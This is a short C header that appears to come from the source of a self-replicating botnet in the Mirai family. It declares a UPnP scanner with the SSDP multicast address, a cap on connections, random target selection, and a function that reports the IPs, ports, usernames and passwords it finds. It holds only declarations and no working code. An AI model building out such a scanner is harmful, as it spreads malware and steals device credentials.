#ifdef SELFREP
#pragma once
#include <stdint.h>
#include "includes.h"
#define UPnP_SCANNER_MAX_CONNS   128
#define UPnP_MCAST_ADDR          "239.255.255.250"
#define UPnP_MCAST_PORT          1900
void upnp_scanner(void);
void upnp_kill(void);
static void upnp_setup_connection(ipv4_t target_ip);
static ipv4_t get_random_upnp_ip(void);
static void upnp_report(ipv4_t ip, uint16_t port, const char *user, const char *pass);
static void log_event(const char *scanner, const char *event, ipv4_t ip, uint16_t port, const char *details);
#endif
